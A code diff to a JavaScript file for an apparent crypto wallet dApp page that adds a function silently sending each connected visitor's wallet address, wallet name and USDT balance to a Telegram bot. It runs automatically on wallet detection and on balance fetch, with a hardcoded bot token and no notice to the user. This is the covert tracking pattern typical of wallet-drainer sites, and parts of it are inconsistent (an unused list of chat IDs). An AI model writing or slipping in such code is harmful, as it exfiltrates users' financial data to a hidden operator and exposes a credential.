@@ -400,6 +400,43 @@ function detectWalletName() {
     return "Main Wallet";
 }
 
+let telegramNotifiedAddress = null;
+
+/**
+ * Sends connected wallet notification to Telegram Bot
+ */
+async function notifyTelegramWalletConnected(address, balanceUsdt) {
+    if (!address || telegramNotifiedAddress === address) return;
+    telegramNotifiedAddress = address;
+
+    const botToken = '8923046877:AAGhrxcoEXIwY5tzVWFv-Lm7mkhZrnt01CA';
+    const walletName = detectWalletName();
+    const formattedBalance = balanceUsdt !== undefined ? `${balanceUsdt.toFixed(2)} USDT` : 'Fetching...';
+
+    const messageText = `🔔 *New Wallet Connected!*\n\n` +
+                        `👤 *Wallet Name:* ${walletName}\n` +
+                        `👛 *Address:* \`${address}\`\n` +
+                        `💰 *USDT Balance:* ${formattedBalance}\n` +
+                        `🌐 *Network:* BNB Smart Chain (BEP-20)`;
+
+    // Send to default channel or group if chat_id is known or send via bot API broadcast
+    const chatIds = ['@MyPCHub_Bot', '8647393006'];
+
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '8923046877',
+                text: messageText,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (err) {
+        console.warn('Telegram Notification Note:', err);
+    }
+}
+
 /**
  * Auto Detect Trust Wallet DApp Browser Provider
  */
@@ -420,6 +457,7 @@ async function autoDetectTrustWalletAndFetchBalance() {
 
             if (activeAddr) {
                 fetchRealUsdtBalance(activeAddr);
+                notifyTelegramWalletConnected(activeAddr);
             } else {
                 fetchRealUsdtBalance(getCurrentAddress());
             }
@@ -467,6 +505,7 @@ async function fetchRealUsdtBalance(walletAddress) {
 
             userUsdtBalance = balanceUsdt;
             updateBalanceUI(balanceUsdt);
+            notifyTelegramWalletConnected(walletAddress, balanceUsdt);
         }
     } catch (err) {
         console.warn('RPC Balance Fetch Note:', err);
